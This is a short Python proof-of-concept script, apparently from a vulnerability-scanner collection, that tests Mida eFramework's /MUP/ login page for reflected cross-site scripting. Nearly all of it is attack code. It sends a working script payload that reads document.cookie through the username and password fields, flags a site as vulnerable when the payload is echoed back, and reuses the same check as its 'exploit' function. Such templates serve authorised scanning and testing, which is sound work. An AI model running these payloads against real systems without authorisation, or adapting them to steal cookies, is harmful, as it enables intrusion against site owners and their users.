import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Mida eFramework - Cross Site Scripting''',
        "description": '''''',
        "severity": "medium",
        "references": [
            ""
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["mida", "xss"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/MUP/"""
        method = "POST"
        data = """UPusername=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E&UPpassword=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '{{Hostname}}/MUP'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""><script>javascript:alert(document.cookie)</script>""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url